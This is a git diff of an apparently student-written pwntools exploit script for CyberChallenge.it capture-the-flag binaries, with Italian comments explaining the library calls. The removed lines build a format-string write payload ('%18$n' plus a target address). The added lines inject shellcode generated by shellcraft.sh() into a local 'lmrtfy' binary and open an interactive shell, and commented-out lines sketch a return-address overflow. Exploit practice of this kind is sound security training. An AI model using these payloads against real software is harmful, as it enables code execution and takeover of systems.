@@ -9,11 +9,12 @@ def main():
     remote(hostname, port) apre una socket e ritorna un object
     che può essere usato per inviare e ricevere dati sulla socket  
     '''
-    HOST = "answer.challs.cyberchallenge.it"
-    PORT = 9122
-    r = remote(HOST, PORT)
-    #exe = ELF("./the_answer")
-    #r = process(exe.path)
+    HOST = "lmrtfy.challs.cyberchallenge.it"
+    PORT = 9124
+    #r = remote(HOST, PORT)
+    exe = ELF("./lmrtfy")
+    context.binary = exe
+    r = process(exe.path)
 
 
     # .send() può essere invocato sull'oggetto ritornato da remote() per inviare dati
@@ -28,13 +29,15 @@ def main():
 
     # .recvuntil() legge dalla socket finchè non viene incontrata la stringa "something"
 
-    answer_address = p64(0x601078, endianness='little')
-    string = "s" * 42
-    string_bytes = str.encode(string)
-    payload = string_bytes + b"%18$naaaaaaaaaaaaaaaaa" + answer_address
+    #return_address = p32(0x08048593, endianness='little') #gadget address
+    #string = "a" * 44 #40 buff bytes + 4 frame pointer bytes
+    #string_bytes = str.encode(string)
+    payload = asm(shellcraft.sh())
+
     print(type(payload))
     print(payload)
-    data = r.recv(1024)
+
+    data = r.recv(1024);
     r.sendline(payload)
 
     data = r.recv(1024)
@@ -43,11 +46,8 @@ def main():
     data = r.recv(1024)
     print(data)
 
-    data = r.recv(1024)
-    print(data)
-
     # permette di interagire con la connessione direttamente dalla shell
-    #r.interactive()
+    r.interactive()
 
     # chiude la socket
     r.close()
